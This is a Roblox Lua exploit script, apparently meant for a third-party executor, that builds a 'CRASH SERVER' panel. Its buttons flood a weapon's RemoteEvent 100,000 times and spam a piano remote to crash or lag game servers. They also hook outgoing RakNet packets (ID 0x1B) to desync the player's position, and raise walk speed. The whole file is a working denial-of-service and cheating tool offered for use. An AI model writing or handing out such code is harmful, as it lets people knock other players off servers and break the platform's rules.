local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local pianoRemote = game:GetService("Workspace"):FindFirstChild("GlobalPianoConnector")

_G.crash = false
_G.rakhook = nil


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AdminPanelToggleGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui


local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 370)
frame.Position = UDim2.new(0.5, -150, 0.5, -185)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame


local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -40, 0, 30)
titleLabel.Position = UDim2.new(0, 10, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "CRASH SERVER"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 18
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = frame


local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 20)
statusLabel.Position = UDim2.new(0, 10, 0, 32)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: Ready"
statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = frame

local function setStatus(text, color)
    statusLabel.Text = "Status: " .. text
    statusLabel.TextColor3 = color or Color3.fromRGB(180, 180, 180)
end

if not pianoRemote then
    setStatus("Piano Remote Not Found!", Color3.fromRGB(255, 80, 80))
end


local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 18
closeButton.BorderSizePixel = 0
closeButton.SelectionImageObject = Instance.new("Frame") -- Removes selection focus blue box
closeButton.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = closeButton

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)


local container = Instance.new("ScrollingFrame")
container.Size = UDim2.new(1, -20, 1, -65)
container.Position = UDim2.new(0, 10, 0, 58)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.ScrollBarThickness = 3
container.Parent = frame

local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 8)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Parent = container


local function createButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -6, 0, 32)
    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 13
    btn.SelectionImageObject = Instance.new("Frame")
    btn.Parent = container

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn

    btn.MouseButton1Click:Connect(callback)
end

local function createToggle(text, default, callback)
    local state = default
    local toggleFrame = Instance.new("Frame")
    toggleFrame.Size = UDim2.new(1, -6, 0, 32)
    toggleFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    toggleFrame.BorderSizePixel = 0
    toggleFrame.Parent = container

    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 6)
    toggleCorner.Parent = toggleFrame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -40, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.Text = text
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Gotham
    label.TextSize = 13
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.BackgroundTransparency = 1
    label.Parent = toggleFrame

    local toggleBtn = Instance.new("TextButton")
    toggleBtn.Size = UDim2.new(0, 18, 0, 18)
    toggleBtn.Position = UDim2.new(1, -25, 0.5, -9)
    toggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 180, 100) or Color3.fromRGB(60, 60, 60)
    toggleBtn.BorderSizePixel = 0
    toggleBtn.Text = ""
    toggleBtn.SelectionImageObject = Instance.new("Frame")
    toggleBtn.Parent = toggleFrame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 4)
    btnCorner.Parent = toggleBtn

    toggleBtn.MouseButton1Click:Connect(function()
        state = not state
        toggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 180, 100) or Color3.fromRGB(60, 60, 60)
        task.spawn(callback, state)
    end)
end

local function createSlider(text, min, max, default, callback)
    local sliderFrame = Instance.new("Frame")
    sliderFrame.Size = UDim2.new(1, -6, 0, 42)
    sliderFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    sliderFrame.BorderSizePixel = 0
    sliderFrame.Parent = container

    local sCorner = Instance.new("UICorner")
    sCorner.CornerRadius = UDim.new(0, 6)
    sCorner.Parent = sliderFrame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 18)
    label.Position = UDim2.new(0, 10, 0, 2)
    label.Text = text .. ": " .. tostring(default)
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Gotham
    label.TextSize = 12
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.BackgroundTransparency = 1
    label.Parent = sliderFrame

    local track = Instance.new("TextButton")
    track.Size = UDim2.new(1, -20, 0, 6)
    track.Position = UDim2.new(0, 10, 0, 26)
    track.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    track.BorderSizePixel = 0
    track.Text = ""
    track.AutoButtonColor = false
    track.SelectionImageObject = Instance.new("Frame")
    track.Parent = sliderFrame

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fill.BorderSizePixel = 0
    fill.Parent = track

    local dragging = false
    local function update(input)
        local posX = math.clamp(input.Position.X - track.AbsolutePosition.X, 0, track.AbsoluteSize.X)
        local percent = posX / track.AbsoluteSize.X
        local val = math.floor(min + (max - min) * percent)
        fill.Size = UDim2.new(percent, 0, 1, 0)
        label.Text = text .. ": " .. tostring(val)
        task.spawn(callback, val)
    end

    track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            update(input)
        end
    end)

    track.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            update(input)
        end
    end)
end


createButton("Gun Crash", function()
    setStatus("Executing Gun Crash...", Color3.fromRGB(255, 200, 0))
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player:WaitForChild("Backpack")
    local firstTool = backpack:FindFirstChildOfClass("Tool")

    if firstTool then
        firstTool.Parent = character
    end

    task.wait(0.5)

    local remote = player.Character:WaitForChild("\217\129\217\132\217\136\216\179 \217\132\217\138\216\168\217\138\216\167\216\170"):WaitForChild("RemoteEvent")

    for i = 1, 100000 do
        remote:FireServer()
    end
    setStatus("Gun Crash Fired!", Color3.fromRGB(0, 255, 120))
end)

createToggle("Lag Everyone", false, function(Value)
    _G.crash = Value
    if Value then
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Sit then
            setStatus("Lag Enabled!", Color3.fromRGB(0, 255, 120))
        else
            setStatus("Error: Sit behind piano!", Color3.fromRGB(255, 80, 80))
            return
        end
        while _G.crash do
            if pianoRemote then
                for i = 1, 61 do
                    pianoRemote:FireServer("play", i)
                end
            end
            task.wait()
        end
        if pianoRemote then
            pianoRemote:FireServer("abort")
        end
        setStatus("Lag Disabled", Color3.fromRGB(180, 180, 180))
    else
        setStatus("Lag Disabled", Color3.fromRGB(180, 180, 180))
    end
end)

createButton("Gloves", function()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local originalPosition = humanoidRootPart.Position
    
    setStatus("Gloves: Teleporting...", Color3.fromRGB(255, 200, 0))
    humanoidRootPart.CFrame = CFrame.new(Vector3.new(-502.56, 9.90, 277.64))
    
    task.wait(1)
    setStatus("Hook: ENABLED ✅", Color3.fromRGB(0, 255, 120))
    
    _G.rakhook = function(packet)
        if packet.PacketId == 0x1B then
            local data = packet.AsBuffer
            buffer.writeu32(data, 1, 0xFFFFFFFF)
            packet:SetData(data)
        end
    end
    
    raknet.add_send_hook(_G.rakhook)
    
    task.wait(0.5)
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
    
    task.wait(0.5)
    setStatus("Gloves: Returned!", Color3.fromRGB(0, 255, 120))
end)

createButton("Refresh", function()
    if _G.rakhook then
        raknet.remove_send_hook(_G.rakhook)
        _G.rakhook = nil
    end
    setStatus("Hook: DISABLED ❌", Color3.fromRGB(255, 80, 80))
end)

createToggle("Desync", false, function(Value)
    local function rakhook(packet)
        if packet.PacketId == 0x1B then
            local data = packet.AsBuffer
            buffer.writeu32(data, 1, 0xFFFFFFFF)
            packet:SetData(data)
        end
    end

    if Value then
        setStatus("Desync: ENABLED ✅", Color3.fromRGB(0, 255, 120))
        raknet.add_send_hook(rakhook)
    else
        setStatus("Desync: DISABLED ❌", Color3.fromRGB(255, 80, 80))
        raknet.remove_send_hook(rakhook)
    end
end)

createSlider("Walkspeed", 16, 160, 16, function(Value)
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.WalkSpeed = Value
        setStatus("Walkspeed: " .. tostring(Value), Color3.fromRGB(180, 180, 180))
    end
end)
